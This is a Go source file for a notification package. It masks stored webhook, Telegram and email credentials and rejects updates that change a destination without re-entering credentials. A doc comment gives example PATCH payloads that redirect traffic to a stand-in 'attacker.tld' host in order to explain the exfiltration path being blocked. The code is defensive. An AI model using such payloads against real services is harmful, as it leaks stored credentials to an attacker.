package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for masked values. When the API echoes
// credentials, it replaces the real content with a value carrying this prefix;
// when the update endpoint receives a value with this prefix, it interprets it
// as "keep the value stored in the database unchanged".
//
// A prefix rather than an empty string or some fixed constant is used so that a
// little identifying information can be carried along (see MaskedValue), letting
// users tell "which bot this is" without re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              the original value is too short; give no hint
//	"__masked__:…ab12cd"      include the last 6 characters as an identifying hint
//
// Exposing only the last 6 characters is deliberate: the identifying information
// in a webhook URL is at the tail (e.g. the WeCom key, the Feishu bot id), while
// the prefix is the same for every bot and has no identifying value. The last 6
// characters are not enough to reconstruct the credential, but enough for the
// configurer to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. it was echoed by the
// API and not modified).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the configuration with the channel's credential
// fields replaced by masked values.
//
// An unknown channel type returns an empty map rather than the original
// configuration — better to let the UI show "configuration unavailable" than to
// spit back the whole original content, which may contain credentials, when the
// channel type cannot be recognized. Non-credential fields are preserved as-is
// so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures such as headers are treated as a single credential
		// as a whole: judging each sub-key would require every channel to declare
		// another set of rules for "which sub-keys are credentials", which costs
		// far more than it gains.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials indicates that "the destination
// address changed, but the caller did not state a position on the credential
// fields". It is returned rather than silently allowing the change or silently
// dropping the credentials; see PrepareConfigUpdate for the rationale.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys with no explicit position
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "destination address (" + strings.Join(e.Changed, ", ") + ") changed. Re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + ") as well: either provide new values, or leave them empty to indicate that credentials are no longer required. " +
		"The existing credentials are valid only for the previous address, so using them as-is would hand them to the new address."
}

// PrepareConfigUpdate merges channel configuration and handles the
// security-sensitive case of "destination address change".
//
// It replaces bare MergeConfig on the channel update path. It addresses a path
// that is proven feasible in practice: the destination address (where messages
// are sent) and the credentials (what identity they are sent with) are two
// independent sets of fields, and MergeConfig always keeps the stored value for
// "keys not mentioned". So anyone who can PATCH a channel only needs to **change
// the address while saying nothing about the credentials** to make the server
// send the real credentials from the database to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header is sent out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<realToken>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → username and password handed over after STARTTLS
//
// This path is completely silent and does not rely on redirects (so rejecting
// cross-host redirects does not stop it), and it directly defeats the goal of this
// package's masking mechanism — "credentials are not echoed back to the browser".
//
// Rule: whenever any destination key is changed to a new value, the caller must
// explicitly state a position on **every** credential key:
//   - provide a new value → use the new value
//   - explicitly pass an empty string → the field no longer needs credentials (preserving clear semantics)
//   - echo the masked value unchanged / simply omit the key → reject
//
// The third case is also rejected because the meaning of a "masked value" is
// exactly "reuse the old credential", and the old credential is valid only for
// the old address. Deliberately not doing "automatically drop credentials" here
// — for optional credential fields (webhook headers, email password) that would
// silently become "authentication is gone but the API returns 200", which is
// harder to troubleshoot than an error. Better to make the operator fill it in
// one extra time.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("Unregistered channel type: %q", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook headers, which is an object)
	// has the masking literal embedded inside it, the caller has stuffed the
	// "keep the original value" sentinel into the interior of a structure.
	// MergeConfig only recognizes "a string with the prefix" as masked, so this
	// shape would be stored as an ordinary object — the literal "__masked__" would
	// actually land in the database, subsequent authentication would silently fail,
	// and there would be no error. Better to reject it.
	//
	// This check must come **first**: when the address is unchanged the function
	// takes the early return, so putting it later would cover only the "change
	// address" path (the first version made exactly this mistake; the tests caught
	// it immediately).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were actually changed. A masked value means
	// "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// The address did not change; use ordinary merging (masked values keep the
		// original, empty strings clear, everything else overrides).
		return MergeConfig(stored, incoming), nil
	}

	// The address changed: require an explicit position on every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submitting the masking sentinel embedded in a
// non-string structure.
//
// The masking mechanism assumes "the whole value is a string". For object fields
// such as webhook headers, the field can only be masked as a whole (written as the
// string "__masked__") or submitted as a whole; stuffing the sentinel inside the
// object neither expresses "keep unchanged" nor avoids being stored in the
// database as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("the contents of field %s contain the masking marker (%q). This field must either be left entirely empty to keep the existing value, or submitted entirely as a new value; the masking marker cannot be embedded inside a structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two configuration values are equivalent.
// Comparing via JSON serialization also handles type differences — the port
// submitted by the frontend is a number, while the value read back from the
// database is a float64, so a direct == would misjudge.
//
// "Blank" must be normalized before comparing: an empty string and "the key does
// not exist" are the same state in this configuration model, because MergeConfig
// treats an empty string as an explicit clear and deletes the key. Without
// normalization, an optional destination field that is always left blank (the
// Telegram base_url is the only such field: blank means use the official address)
// would follow this path:
//
//	base_url:"" stored on creation  →  the first save deletes the key via MergeConfig
//	→ on the second save incoming is "" and stored lacks the key, judged as "address changed"
//	→ the credential is a masked value → 400 "destination address has changed, please re-enter the credential fields as well"
//
// After that every save fails unless the user re-pastes the Bot Token, even though
// they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue determines whether a configuration value is "blank".
// The criteria must match MergeConfig's clear check (strings.TrimSpace(s) == ""),
// otherwise a gap appears where "MergeConfig thinks it should delete but
// sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating channel
// configuration.
//
// Rules:
//   - a key in incoming whose value is masked → keep the original value from stored (the user did not change this field)
//   - a key in incoming whose value is an empty string → treated as an explicit clear, delete the key
//   - other keys → override with the value from incoming
//   - keys present in stored but absent from incoming → keep (partial-update semantics)
//
// Whether an empty string counts as "clear" needs to be explicit: the frontend
// form submits unfilled fields as empty strings, and treating them as valid
// values to write would actually wipe fields meant to be "left blank to keep the
// original value". An explicit clear is chosen here because, when clearing a
// misconfigured field, the user has no other way to express it (dragging the
// field away could distinguish "not provided" from "provided empty", but the UI
// does not use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified; keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
